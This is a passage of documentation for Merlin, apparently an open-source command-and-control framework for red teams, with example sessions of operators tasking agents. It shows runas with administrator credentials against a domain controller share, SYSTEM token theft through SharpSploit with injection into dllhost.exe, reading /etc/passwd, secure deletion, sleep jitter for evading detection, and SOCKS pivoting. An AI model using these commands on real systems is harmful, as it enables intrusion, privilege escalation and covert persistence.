5768    1844    x64     DESKTOP-H39FR21\bob     taskhostw.exe
5716    736     x64     BUILTIN\Administrators  svchost.exe
2396    736     x64     NT AUTHORITY\SYSTEM     svchost.exe
6220    2396    x64     DESKTOP-H39FR21\bob     ctfmon.exe
6464    736     x64     NT AUTHORITY\LOCAL SERVICE      svchost.exe
6504    6376    x64     DESKTOP-H39FR21\bob     explorer.exe
</pre></div>
</div>
</section>
<section id="pwd">
<h2>pwd<a class="headerlink" href="#pwd" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">pwd</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">pwd</span></code> command uses native Go to get and return the current working directory.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» pwd
[-]Created job JweUayTyTv for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

[-] Results job JweUayTyTv for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

[+] Current working directory: C:\Users\Joe
</pre></div>
</div>
</section>
<section id="quit">
<h2>quit<a class="headerlink" href="#quit" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">quit</span> <span class="pre">[-y]</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">quit</span></code> command is used to exit out of the Merlin Server application. This is also an alias for the <code class="docutils literal notranslate"><span class="pre">exit</span></code> command.</p>
</section>
<section id="rev2self">
<h2>rev2self<a class="headerlink" href="#rev2self" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>This command is only available to agent running on a <code class="docutils literal notranslate"><span class="pre">Windows</span></code> operating system!</p>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">rev2self</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">rev2self</span></code> command reverts the thread impersonation token to the process token.
This command is an alias for the <a class="reference internal" href="#token-rev2self"><span class="std std-ref">rev2self</span></a> command.
Leverages the RevertToSelf Windows API function.</p>
<p>References:</p>
<blockquote>
<div><ul class="simple">
<li><p><a class="reference external" href="https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-reverttoself">https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-reverttoself</a></p></li>
</ul>
</div></blockquote>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» rev2self
[-] Created job ZXKyKuIZru for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
[-] Results job ZXKyKuIZru for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
[+] Successfully reverted to self and dropped the impersonation token
</pre></div>
</div>
</section>
<section id="rm">
<span id="id23"></span><h2>rm<a class="headerlink" href="#rm" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">rm</span> <span class="pre">filePath</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">rm</span></code> command will remove or delete a file using native Go functions.</p>
<p>`` rm &lt;file path&gt;``</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][336154be-9ab9-4add-96e6-69c79f1ce77d]» rm C:\\Users\\rastley\\Downloads\\lyrics.txt
[-] Created job jwGxSVYMDY for agent 336154be-9ab9-4add-96e6-69c79f1ce77d

[-] Results job jwGxSVYMDY for agent 336154be-9ab9-4add-96e6-69c79f1ce77d

[+] successfully removed file C:\Users\rastley\Downloads\lyrics.txt
</pre></div>
</div>
</section>
<section id="runas">
<h2>runas<a class="headerlink" href="#runas" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>This command is only available to agent running on a <code class="docutils literal notranslate"><span class="pre">Windows</span></code> operating system!</p>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">runas</span> <span class="pre">DOMAIN\USER</span> <span class="pre">password</span> <span class="pre">program</span> <span class="pre">[arguments]</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">runas</span></code> command will run a program as another user. This is done using the <a class="reference external" href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithlogonw">CreateProcessWithLogonW</a> Windows API call.</p>
<p><code class="docutils literal notranslate"><span class="pre">runas</span> <span class="pre">&lt;Domain\\User&gt;</span> <span class="pre">&lt;Password&gt;</span> <span class="pre">&lt;program&gt;</span> <span class="pre">[&lt;program</span> <span class="pre">args&gt;]</span></code></p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][336154be-9ab9-4add-96e6-69c79f1ce77d]» runas ACME\\Administrator S3cretPassw0rd cmd.exe /c dir \\\\DC01.ACME.COM\\C$
[-] Created job PABQYrMLYO for agent 336154be-9ab9-4add-96e6-69c79f1ce77d

[-] Results job PABQYrMLYO for agent 336154be-9ab9-4add-96e6-69c79f1ce77d

[+] Created cmd.exe process with PID 2120
</pre></div>
</div>
</section>
<section id="run">
<span id="id24"></span><h2>run<a class="headerlink" href="#run" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">run</span> <span class="pre">program</span> <span class="pre">[arguments]</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">run</span></code> command is used to task the agent to run a program on the host and return STDOUT/STDERR. When issuing a command to an agent from
the server, the agent will execute the provided binary file for the program you specified and also pass along any
arguments you provide. It is important to note that program must be in the path. This allows an operator to specify and
use a shell (e.g.,. cmd.exe, powershell.exe, or /bin/bash) or to execute the program directly <em>WITHOUT</em> a shell.
For instance, <code class="docutils literal notranslate"><span class="pre">ping.exe</span></code> is typically in the host’s %PATH% variable on Windows and works <em>without</em> specifying <code class="docutils literal notranslate"><span class="pre">cmd.exe</span></code>.
However, the <code class="docutils literal notranslate"><span class="pre">ver</span></code> command is not an executable in the %PATH% and therefore <em>must</em> be run from <code class="docutils literal notranslate"><span class="pre">cmd.exe</span></code>.
Use the <a class="reference internal" href="#shell">shell</a> command if you want to use the operating system’s default shell directly.</p>
<p>Example using ping:</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» run ping 8.8.8.8
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [-]Created job DTBnkIfnus for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
[+]Results for job DTBnkIfnus

Pinging 8.8.8.8 with 32 bytes of data:
Reply from 8.8.8.8: bytes=32 time=23ms TTL=54
Reply from 8.8.8.8: bytes=32 time=368ms TTL=54
Reply from 8.8.8.8: bytes=32 time=26ms TTL=54
Reply from 8.8.8.8: bytes=32 time=171ms TTL=54

Ping statistics for 8.8.8.8:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 23ms, Maximum = 368ms, Average = 147ms
</pre></div>
</div>
<p>Example running <code class="docutils literal notranslate"><span class="pre">ver</span></code> <em>without</em> <code class="docutils literal notranslate"><span class="pre">cmd.exe</span></code>:</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» run ver
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [-]Created job iOMPERNYGT for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
[+]Results for job iOMPERNYGT
exec: &quot;ver&quot;: executable file not found in %PATH%
</pre></div>
</div>
<p>Example running <code class="docutils literal notranslate"><span class="pre">ver</span></code> <em>with</em> <code class="docutils literal notranslate"><span class="pre">cmd.exe</span></code>:</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» run cmd.exe /c ver
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [-]Created job IxVXgyIkhS for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
[+]Results for job IxVXgyIkhS

Microsoft Windows [Version 10.0.16299.64]
</pre></div>
</div>
<section id="shell-functions">
<h3>Shell Functions<a class="headerlink" href="#shell-functions" title="Link to this heading"></a></h3>
<p>Some commands and capabilities are components of a shell and can <em>ONLY</em> be used with a shell.
For example, the <code class="docutils literal notranslate"><span class="pre">dir</span></code> command is a component of <code class="docutils literal notranslate"><span class="pre">cmd.exe</span></code> and is not its own program executable.
Therefore, <code class="docutils literal notranslate"><span class="pre">dir</span></code> can only be used within the <code class="docutils literal notranslate"><span class="pre">cmd.exe</span></code> shell.
In order to use the <cite>dir</cite>, you must provide executable of the shell environment where that command resides.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» run cmd.exe /c dir
</pre></div>
</div>
<p>The pipe and redirection characters <code class="docutils literal notranslate"><span class="pre">|</span></code> , <code class="docutils literal notranslate"><span class="pre">&gt;</span></code> , and <code class="docutils literal notranslate"><span class="pre">&lt;</span></code> , are also functions of a shell environment.
If you want to use them, you must do so <em>WITH</em> a shell.
For Linux, an example would be:</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»run bash -c &quot;cat /etc/passwd | grep root&quot;
</pre></div>
</div>
</section>
<section id="quoted-arguments">
<h3>Quoted Arguments<a class="headerlink" href="#quoted-arguments" title="Link to this heading"></a></h3>
<p>When running a command on an agent from the server, the provided arguments are passed to executable that was called.
As long as there are no special characters (e.g., <code class="docutils literal notranslate"><span class="pre">\</span></code> , <code class="docutils literal notranslate"><span class="pre">&amp;</span></code> , <code class="docutils literal notranslate"><span class="pre">;</span></code> , <code class="docutils literal notranslate"><span class="pre">|</span></code> , <code class="docutils literal notranslate"><span class="pre">&gt;</span></code> , <code class="docutils literal notranslate"><span class="pre">&lt;</span></code> etc.) the command will be processed fine.</p>
<p>For example, this command will work fine because it does not have any special characters:</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» run powershell.exe Get-Service -Name win* -Exclude WinRM
</pre></div>
</div>
<p>However, this command <strong>WILL</strong> fail because of the <code class="docutils literal notranslate"><span class="pre">|</span></code> symbol. The command will still execute, but will stop processing everything after the <code class="docutils literal notranslate"><span class="pre">|</span></code> symbol.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» run powershell.exe Get-Service -Name win* -Exclude WinRM | fl
</pre></div>
</div>
<p>To circumvent this, enclose the entire argument in quotes. The outer most quotes will be removed when the arguments are
passed. Any inner quotes need to be escaped. The argument can be enclosed in double quotes or single quotes.
The command be executed in both of these ways:</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» run powershell.exe &quot;Get-Service -Name win* -Exclude WinRM | fl&quot;
</pre></div>
</div>
<p><strong>OR</strong></p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» run powershell.exe &quot;Get-Service -Name \&quot;win*\&quot; -Exclude &quot;WinRM&quot; | fl&quot;
</pre></div>
</div>
<p><strong>OR</strong></p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» run powershell.exe &#39;Get-Service -Name \&#39;win*\&#39; -Exclude &#39;WinRM&#39; | fl&#39;
</pre></div>
</div>
</section>
<section id="escape-sequence">
<h3>Escape Sequence<a class="headerlink" href="#escape-sequence" title="Link to this heading"></a></h3>
<p>Following along with the Quoted Arguments section above, the <code class="docutils literal notranslate"><span class="pre">\</span></code> symbol will be interpreted as an escape sequence.
This is beneficial because it can be used to escape other characters like the pipe symbol, <code class="docutils literal notranslate"><span class="pre">|</span></code> .
However, it can work against you when working with Windows file paths and the arguments are not enclosed in quotes.</p>
<p>This command will fail because the <code class="docutils literal notranslate"><span class="pre">\</span></code> itself needs to escaped. Notice the error message shows <code class="docutils literal notranslate"><span class="pre">C:WindowsSystem32</span></code>:</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» run cmd.exe /c C:\Windows\System32
[-]Created job hBYxRfaRBG for agent 21a0fc5f-14ad-4c43-b41e-57eab1feb0e1
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [+]Results for job hBYxRfaRBG
[+]&#39;C:WindowsSystem32&#39; is not recognized as an internal or external command,
operable program or batch file.
[!]exit status 1
</pre></div>
</div>
<p>To correctly issue the command either escape the <code class="docutils literal notranslate"><span class="pre">\</span></code> or enclose the commands in quotes:</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» run cmd.exe /c dir C:\\Windows\\System32
</pre></div>
</div>
</section>
</section>
<section id="sdelete">
<h2>sdelete<a class="headerlink" href="#sdelete" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">sdelete</span> <span class="pre">filePath</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">sdelete</span></code> command securely deletes a file.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» sdelete /tmp/deleteMe.txt
[-] Created job ZfLruZBwbR for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

[-] Results job ZfLruZBwbR for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

[+] Securely deleted file: /tmp/deleteMe.txt
</pre></div>
</div>
</section>
<section id="sessions">
<h2>sessions<a class="headerlink" href="#sessions" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">sessions</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">sessions</span></code> command is used to quickly list information about established agents from the main menu to include their status.
The sessions command is available from any menu in the CLI.</p>
<ul class="simple">
<li><p><strong>AGENT GUID</strong> - A unique identifier for every running instance</p></li>
<li><p><strong>TRANSPORT</strong> - The protocol the agent is communicating over</p></li>
<li><p><strong>PLATFORM</strong> - The operating system and architecture the agent is running on</p></li>
<li><p><strong>HOST</strong> - The hostname where the agent is running</p></li>
<li><p><strong>USER</strong> - The username that hte agent is running as</p></li>
<li><p><strong>PROCESS</strong> - The Agent’s process name followed by its Process ID (PID) in parenthesis</p></li>
<li><p><strong>STATUS</strong> - The Agent’s communiction status of either active, delayed, or dead</p></li>
<li><p><strong>LAST CHECKIN</strong> - The amount of time that has passed since the agent last checked in</p></li>
<li><p><strong>NOTE</strong> - A free-form text area for operators to record notes about a specific agent; tracked server-side only</p></li>
</ul>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin» sessions

               AGENT GUID              |    TRANSPORT    |   PLATFORM    |      HOST       |        USER         |                 PROCESS                  | STATUS | LAST CHECKIN |      NOTE
+--------------------------------------+-----------------+---------------+-----------------+---------------------+------------------------------------------+--------+--------------+-----------------+
  d07edfda-e119-4be2-a20f-918ab701fa3c | HTTP/2 over TLS | linux/amd64   | ubuntu          | rastley             | main(200769)                             | Active | 0:00:08 ago  | Demo Agent Here
</pre></div>
</div>
</section>
<section id="sharpgen">
<h2>sharpgen<a class="headerlink" href="#sharpgen" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>This command is only available to agent running on a <code class="docutils literal notranslate"><span class="pre">Windows</span></code> operating system!</p>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">sharpgen</span> <span class="pre">&lt;C#</span> <span class="pre">code&gt;</span> <span class="pre">[spawnto]</span> <span class="pre">[spawnto_args]</span></code></p>
</div>
<div class="admonition warning">
<p class="admonition-title">Warning</p>
<p>The .NET Core 2.1 SDK must be manually installed by the operator and the SharpGen executable must be built before the <code class="docutils literal notranslate"><span class="pre">sharpgen</span></code> command can be used</p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">sharpgen</span></code> command leverages Ryan Cobb’s <a class="reference external" href="https://github.com/cobbr/SharpGen">SharpGen</a> project and the <a class="reference external" href="https://dotnet.microsoft.com/download/dotnet-core/2.1">.NET Core 2.1 SDK</a> to dynamically compile and execute .NET assemblies. After assembly is compiled, the same steps documented in <a class="reference internal" href="#execute-assembly">execute-assembly</a> are followed. SharpGen also leverages functionality from the <a class="reference external" href="https://github.com/cobbr/SharpSploit">SharpSploit</a> project that can be called directly from this <code class="docutils literal notranslate"><span class="pre">shargen</span></code> command. This command uses a hardcoded output that places compiled executables to the Merlin root directory as <code class="docutils literal notranslate"><span class="pre">sharpgen.exe</span></code>.</p>
<p>For more granular control and additional configuration options, use the <code class="docutils literal notranslate"><span class="pre">windows/x64/csharp/misc/SharpGen</span></code> module.</p>
<p>SharpGen is git a submodule in the <code class="docutils literal notranslate"><span class="pre">data/src/cobbr/SharpGen</span></code> directory. From this directory, run the <code class="docutils literal notranslate"><span class="pre">dotnet</span> <span class="pre">build</span> <span class="pre">-c</span> <span class="pre">release</span></code> command to build the <code class="docutils literal notranslate"><span class="pre">SharpGen.dll</span></code> executable.</p>
<p>The <code class="docutils literal notranslate"><span class="pre">sharpgen</span></code> command is executed as: <code class="docutils literal notranslate"><span class="pre">shaprgen</span> <span class="pre">&lt;code&gt;</span> <span class="pre">[&lt;spawnto</span> <span class="pre">path&gt;</span> <span class="pre">&lt;spawnto</span> <span class="pre">args&gt;]</span></code></p>
<p>The <code class="docutils literal notranslate"><span class="pre">code</span></code> positional argument is the .NET code you want to compile and execute. All code is automatically wraped in <code class="docutils literal notranslate"><span class="pre">Console.WriteLine();</span></code> and it does not need to be included again. All other arguments are optional. The <code class="docutils literal notranslate"><span class="pre">&lt;spawnto</span> <span class="pre">path&gt;</span></code> argument is the process that will be started on the target and where the shellcode will be injected and executed. If a <code class="docutils literal notranslate"><span class="pre">&lt;spawnto</span> <span class="pre">path&gt;</span></code> is not provided, <code class="docutils literal notranslate"><span class="pre">C:\WIndows\System32\dllhost.exe</span></code> will be used. The <code class="docutils literal notranslate"><span class="pre">&lt;spawnto</span> <span class="pre">args&gt;</span></code> value is used as an argument when starting the spawnto process.</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>Use <code class="docutils literal notranslate"><span class="pre">\</span></code> to escape any characters inside of the code argument and use quotes to enclose the entire code argument (e.g., <code class="docutils literal notranslate"><span class="pre">&quot;new</span> <span class="pre">Tokens().MakeToken(\&quot;RAstley\&quot;,</span> <span class="pre">\&quot;\&quot;,</span> <span class="pre">\&quot;P&#64;ssword\&quot;)&quot;</span></code>)</p>
</div>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» sharpgen &quot;new SharpSploit.Credentials.Tokens().GetSystem()&quot;
[-] Created job oeOBXfBuPS for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

[+] Results for c1090dbc-f2f7-4d90-a241-86e0c0217786 job oeOBXfBuPS

Getting system...
Impersonate NT AUTHORITY\SYSTEM...
Processes for NT AUTHORITY\SYSTEM: 25
Attempting to impersonate: NT AUTHORITY\SYSTEM
Attempting to impersonate: NT AUTHORITY\SYSTEM
Impersonated: NT AUTHORITY\SYSTEM
True
</pre></div>
</div>
</section>
<section id="shell">
<span id="id26"></span><h2>shell<a class="headerlink" href="#shell" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">shell</span> <span class="pre">command</span> <span class="pre">[arguments]</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">shell</span></code> command is used to task the agent to execute the provided arguments using the operating system’s default
shell and return STDOUT/STDERR. On Windows the <code class="docutils literal notranslate"><span class="pre">%COMSPEC%</span></code> shell is used and if it is <code class="docutils literal notranslate"><span class="pre">cmd.exe</span></code> then the <code class="docutils literal notranslate"><span class="pre">/c</span></code>
argument is used. For macOS and Linux, the <code class="docutils literal notranslate"><span class="pre">/bin/sh</span></code> shell is used with the <code class="docutils literal notranslate"><span class="pre">-c</span></code> argument.
Use the <a class="reference internal" href="#run">run</a> command to execute a program directly without invoking the shell.</p>
<p>Example using <code class="docutils literal notranslate"><span class="pre">ver</span></code>:</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» shell ver
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [-]Created job IxVXgyIkhS for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
[+]Results for job IxVXgyIkhS

Microsoft Windows [Version 10.0.16299.64]
</pre></div>
</div>
<section id="id27">
<h3>Shell Functions<a class="headerlink" href="#id27" title="Link to this heading"></a></h3>
<p>Some commands and capabilities are components of a shell and can <em>ONLY</em> be used with a shell.
For example, the <code class="docutils literal notranslate"><span class="pre">dir</span></code> command is a component of <code class="docutils literal notranslate"><span class="pre">cmd.exe</span></code> and is not its own program executable.
Therefore, <code class="docutils literal notranslate"><span class="pre">dir</span></code> can only be used within the <code class="docutils literal notranslate"><span class="pre">cmd.exe</span></code> shell.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» shell dir
</pre></div>
</div>
<p>The pipe and redirection characters <code class="docutils literal notranslate"><span class="pre">|</span></code> , <code class="docutils literal notranslate"><span class="pre">&gt;</span></code> , and <code class="docutils literal notranslate"><span class="pre">&lt;</span></code> , are also functions of a shell environment.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» shell &quot;cat /etc/passwd | grep root&quot;
</pre></div>
</div>
</section>
<section id="id28">
<h3>Quoted Arguments<a class="headerlink" href="#id28" title="Link to this heading"></a></h3>
<p>When running a command on an agent from the server, the provided arguments are passed to executable that was called.
As long as there are no special characters (e.g., <code class="docutils literal notranslate"><span class="pre">\</span></code> , <code class="docutils literal notranslate"><span class="pre">&amp;</span></code> , <code class="docutils literal notranslate"><span class="pre">;</span></code> , <code class="docutils literal notranslate"><span class="pre">|</span></code> , <code class="docutils literal notranslate"><span class="pre">&gt;</span></code> , <code class="docutils literal notranslate"><span class="pre">&lt;</span></code> etc.) the command will be processed fine.</p>
<p>For example, this command will work fine because it does not have any special characters:</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» shell powershell.exe Get-Service -Name win* -Exclude WinRM
</pre></div>
</div>
<p>However, this command <strong>WILL</strong> fail because of the <code class="docutils literal notranslate"><span class="pre">|</span></code> symbol. The command will still execute, but will stop processing everything after the <code class="docutils literal notranslate"><span class="pre">|</span></code> symbol.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» shell powershell.exe Get-Service -Name win* -Exclude WinRM | fl
</pre></div>
</div>
<p>To circumvent this, enclose the entire argument in quotes. The outer most quotes will be removed when the arguments are
passed. The argument can be enclosed in double quotes or single quotes. All other quotes need to be escaped
The command be executed in both of these ways:</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» shell powershell.exe &quot;Get-Service -Name win* -Exclude WinRM | fl&quot;
</pre></div>
</div>
<p><strong>OR</strong></p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» shell powershell.exe &quot;Get-Service -Name \&quot;win*\&quot; -Exclude &quot;WinRM&quot; | fl&quot;
</pre></div>
</div>
<p><strong>OR</strong></p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» shell powershell.exe &#39;Get-Service -Name \&#39;win*\&#39; -Exclude &#39;WinRM&#39; | fl&#39;
</pre></div>
</div>
</section>
<section id="id29">
<h3>Escape Sequence<a class="headerlink" href="#id29" title="Link to this heading"></a></h3>
<p>Following along with the Quoted Arguments section above, the <code class="docutils literal notranslate"><span class="pre">\</span></code> symbol will be interpreted as an escape sequence.
This is beneficial because it can be used to escape other characters like the pipe symbol, <code class="docutils literal notranslate"><span class="pre">|</span></code> .
However, it can work against you when working with Windows file paths and the arguments are not enclosed in quotes.</p>
<p>This command will fail because the <code class="docutils literal notranslate"><span class="pre">\</span></code> itself needs to escaped. Notice the error message shows File Not Found:</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» shell dir C:\Windows\System32
[-]Created job hBYxRfaRBG for agent 21a0fc5f-14ad-4c43-b41e-57eab1feb0e1
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [+]Results for job hBYxRfaRBG
[+]  Volume in drive C has no label.
 Volume Serial Number is AC57-CFB9

 Directory of C:\

File Not Found
</pre></div>
</div>
<p>To correctly issue the command either escape the <code class="docutils literal notranslate"><span class="pre">\</span></code> or enclose the commands in quotes:</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» shell dir C:\\Windows\\System32
</pre></div>
</div>
</section>
</section>
<section id="skew">
<span id="id30"></span><h2>skew<a class="headerlink" href="#skew" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">skew</span> <span class="pre">amount</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">skew</span></code> command is used to introduce a jitter or skew to the agent sleep time to keep traffic from occurring at exact time intervals.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» skew 5
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»
[-]Created job lyYQdxckTY for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
</pre></div>
</div>
</section>
<section id="sleep">
<span id="id31"></span><h2>sleep<a class="headerlink" href="#sleep" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">sleep</span> <span class="pre">duration</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">sleep</span></code> control type is used to change the amount of time that an agent will sleep before checking in again.
The default is 30 seconds. The values provided to this command are written in a time format.
For example, <code class="docutils literal notranslate"><span class="pre">30s</span></code> is 30 seconds and <code class="docutils literal notranslate"><span class="pre">60m</span></code> is 60 minutes.
There is no response on the CLI after the instruction has been provided to the agent.
You can verify the setting was changed using the <code class="docutils literal notranslate"><span class="pre">agent</span> <span class="pre">info</span></code> command.</p>
<p>Peer-to-peer bind and reverse Agents can be configured with a negative sleep value (e.g., -10s).
The actual amount doesn’t matter, just that it is negative.
A negative sleep value prevents the peer-to-peer Agent from communicating on the network UNLESS it has a job.
This means there are no status checkin messages back to the Server at a fixed interval.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» sleep 15s
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»
[-]Created job npMYqwASOD for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
</pre></div>
</div>
</section>
<section id="socks">
<h2>socks<a class="headerlink" href="#socks" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">socks</span> <span class="pre">{list</span> <span class="pre">|</span> <span class="pre">start</span> <span class="pre">[interface:]port</span> <span class="pre">agentID</span> <span class="pre">|</span> <span class="pre">stop</span> <span class="pre">[interface:]port</span> <span class="pre">agentID}</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">socks</span></code> command is used to start, stop, or list SOCKS5 listeners. There can only be one SOCKS5 listener per agent.</p>
<ul class="simple">
<li><p><a class="reference internal" href="#socks-list"><span class="std std-ref">list</span></a></p></li>
<li><p><a class="reference internal" href="#socks-start"><span class="std std-ref">start</span></a></p></li>
<li><p><a class="reference internal" href="#socks-stop"><span class="std std-ref">stop</span></a></p></li>
</ul>
<section id="socks-list">
<span id="id32"></span><h3>list<a class="headerlink" href="#socks-list" title="Link to this heading"></a></h3>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">socks</span> <span class="pre">list</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">list</span></code> command will list active SOCKS5 listeners per agent. If the SOCKS5 listener was configured to listen on
all interfaces (e.g., 0.0.0.0), then the interface will be listed as <code class="docutils literal notranslate"><span class="pre">[::]:</span></code>.</p>
